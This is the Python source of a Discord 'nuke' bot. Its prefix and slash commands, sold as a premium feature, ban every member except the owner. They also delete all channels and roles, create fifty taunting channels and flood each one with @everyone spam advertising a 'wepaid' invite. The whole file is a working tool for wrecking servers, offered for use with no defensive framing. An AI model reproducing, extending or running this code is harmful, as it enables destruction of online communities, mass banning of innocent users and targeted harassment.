import discord
from discord.ext import commands
from discord import app_commands
from colorama import init, Fore as cc
from os import name as os_name, system, environ
from sys import exit
import random
import asyncio
import sqlite3

init()
dr = DR = r = R = cc.LIGHTRED_EX
g = G = cc.LIGHTGREEN_EX
b = B = cc.LIGHTBLUE_EX
m = M = cc.LIGHTMAGENTA_EX
c = C = cc.LIGHTCYAN_EX
y = Y = cc.LIGHTYELLOW_EX
w = W = cc.RESET

clear = lambda: system('cls') if os_name == 'nt' else system('clear')

baner = f'''
{r} _   _       _       {m} ____        _   
{r}| \ | |_   _| | _____{m}| __ )  ___ | |_ 
{r}|  \| | | | | |/ / _ {m}\  _ \ / _ \| __|
{r}| |\  | |_| |   <  __{m}/ |_) | (_) | |_ 
{r}|_| \_|\__,_|_|\_\___{m}|____/ \___/ \__|
{y}Made by: {g}https://github.com/Sigma-cc'''

SPAM_MESSAGE = "# 010101010-00-0-00-000100101011010101010101011001910101010010101010101001010 FKD BY WEPAIDDDDD GET BACKKKK https://discord.gg/wepaid @everyone @everyone @everyone"

# Database setup (using SQLite for stability in this environment)
DB_PATH = "bot_data.db"

def setup_db():
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS premium_users (user_id INTEGER PRIMARY KEY)")
    conn.commit()
    conn.close()

def is_premium(user_id):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("SELECT 1 FROM premium_users WHERE user_id = ?", (user_id,))
    res = cur.fetchone()
    conn.close()
    return res is not None

def add_premium(user_id):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("INSERT OR IGNORE INTO premium_users (user_id) VALUES (?)", (user_id,))
    conn.commit()
    conn.close()

setup_db()

async def delete_all_channels(guild):
    deleted = 0
    tasks = []
    for channel in guild.channels:
        tasks.append(channel.delete())
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for res in results:
        if not isinstance(res, Exception):
            deleted += 1
    return deleted

async def delete_all_roles(guild):
    deleted = 0
    tasks = []
    for role in guild.roles:
        if role.name != "@everyone" and not role.managed:
            tasks.append(role.delete())
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for res in results:
        if not isinstance(res, Exception):
            deleted += 1
    return deleted

async def ban_all_members(guild):
    banned = 0
    tasks = []
    for member in guild.members:
        if member != guild.me and member != guild.owner:
            tasks.append(member.ban())
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for res in results:
        if not isinstance(res, Exception):
            banned += 1
    return banned

async def spam_channel(channel):
    while True:
        try:
            await channel.send(SPAM_MESSAGE)
            await asyncio.sleep(0.5)
        except:
            break

async def create_nuke_channels(guild):
    created_channels = []
    names = ["[😂] 𝐆𝐄𝐓𝐁𝐀𝐂𝐊", "[☠️] 𝟕𝟔𝟐𝐇𝐔𝐑𝐓", "[😭] 𝐅𝐊𝐃 𝐁𝐘 𝐖𝐄𝐏𝐀𝐈𝐃", "[🤑] 𝐖𝐄 𝐎𝐖𝐍 𝐘𝐎𝐔"]
    tasks = []
    for _ in range(50):
        tasks.append(guild.create_text_channel(name=random.choice(names)))
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for res in results:
        if not isinstance(res, Exception):
            created_channels.append(res)
    return created_channels

async def nuke_guild(guild):
    print(f'{r}[!] Starting nuke on: {m}{guild.name}')
    await ban_all_members(guild)
    await delete_all_channels(guild)
    await delete_all_roles(guild)
    channels = await create_nuke_channels(guild)
    for channel in channels:
        asyncio.create_task(spam_channel(channel))

# Main entry point
token = environ.get('DISCORD_BOT_TOKEN')
prefix = environ.get('DISCORD_PREFIX', '.')

if not token:
    print(f"{r}[!] DISCORD_BOT_TOKEN not found in secrets!")
    exit()

class MyBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix=prefix, intents=discord.Intents.all())

    async def setup_hook(self):
        await self.tree.sync()

client = MyBot()

@client.event
async def on_ready():
    clear()
    print(baner)
    print(f'''
{c}--------------------------------------------
{g}[+] Logged in as {client.user}
{g}[+] Total Servers: {len(client.guilds)}
{y}[!] Prefix: {prefix}
{y}[!] Slash Commands Enabled
{c}--------------------------------------------''')

@client.tree.command(name="nuke", description="Start the nuke process")
async def nuke_slash(interaction: discord.Interaction):
    if not is_premium(interaction.user.id):
        return await interaction.response.send_message("❌ This command is for premium users only!", ephemeral=True)
    await interaction.response.send_message("🚀 Nuke process started!", ephemeral=True)
    await nuke_guild(interaction.guild)

@client.tree.command(name="add_premium", description="Give a user lifetime premium (Owner Only)")
@app_commands.describe(user="The user to give premium")
async def add_premium_slash(interaction: discord.Interaction, user: discord.User):
    if not await client.is_owner(interaction.user):
         return await interaction.response.send_message("❌ You are not authorized to use this command.", ephemeral=True)
    
    add_premium(user.id)
    await interaction.response.send_message(f"✅ {user.name} has been granted lifetime premium!", ephemeral=True)

@client.command()
async def nuke(ctx):
    if not is_premium(ctx.author.id):
        return await ctx.send("❌ This command is for premium users only!")
    print(f'{y}[!] Nuke command executed in {ctx.guild.name} by {ctx.author}')
    await nuke_guild(ctx.guild)

try:
    client.run(token)
except Exception as e:
    print(f'{r}[!] Critical Error: {e}')
